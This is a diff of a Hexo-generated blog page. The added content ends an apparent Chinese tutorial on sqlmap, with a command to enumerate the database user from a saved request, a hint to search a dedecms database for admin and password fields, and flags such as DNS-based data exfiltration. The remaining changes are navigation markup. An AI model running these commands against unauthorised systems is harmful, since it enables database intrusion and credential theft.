+<p><strong><code>python sqlmap.py -r yancheng.txt -current-user</code></strong><br><img src="https://cdn.nlark.com/yuque/0/2021/png/12407946/1614239937939-205a5f9b-fec5-403d-8c44-f390ec8695f8.png#align=left&display=inline&height=279&margin=%5Bobject%20Object%5D&name=%E5%9B%BE%E7%89%87.png&originHeight=279&originWidth=824&size=13257&status=done&style=none&width=824" alt="图片.png"><br>在dedecms数据库中搜索字段admin或者password。</p>
+<h4 id="优化信息"><a href="#优化信息" class="headerlink" title="优化信息"></a>优化信息</h4><p><code>--threads=</code>最大的线程数，默认为1<br><code>--no-cast</code> 榨取数据时，sqlmap将所有结果转换为字符串，并用空格替换NULL结果<br><code>--dns-domain</code> 攻击者控制了某DNS服务器，使用此功能可以提高数据榨取速度<br><code>--no-escape</code> 避免混淆，sqlmap使用char()编码逃逸的方法替换字符串<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12407946/1614258365402-9be8e9c3-dd9e-42c1-8519-9a4e9a8fe3e0.png#align=left&display=inline&height=16&margin=%5Bobject%20Object%5D&originHeight=38&originWidth=741&size=0&status=done&style=none&width=312"><br> <br>详细的使用见<a target="_blank" rel="noopener" href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">官方文档</a></p>
 
             </div>
             <hr/>
@@ -526,7 +543,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://daveqqq.github.io/2020/10/15/%E7%94%A8github-hexo%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84%E5%8D%9A%E5%AE%A2/">http://daveqqq.github.io/2020/10/15/%E7%94%A8github-hexo%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84%E5%8D%9A%E5%AE%A2/</a>
+                    <a href="http://daveqqq.github.io/2021/03/20/sqlmap%E4%BD%BF%E7%94%A8/">http://daveqqq.github.io/2021/03/20/sqlmap%E4%BD%BF%E7%94%A8/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -729,9 +746,10 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2021/03/20/sqlmap%E4%BD%BF%E7%94%A8/">
                     <div class="card-image">
@@ -749,9 +767,9 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-03-20
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-03-20
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -760,6 +778,7 @@
                         </span>
                     </div>
                 </div>
+
                 
             </div>
         </div>
@@ -767,7 +786,7 @@
         
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge right-badge text-color">
-                本篇&nbsp;<i class="far fa-dot-circle"></i>
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
                 <a href="/2020/10/15/%E7%94%A8github-hexo%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84%E5%8D%9A%E5%AE%A2/">
@@ -797,7 +816,6 @@
                         </span>
                     </div>
                 </div>
-
                 
             </div>
         </div>
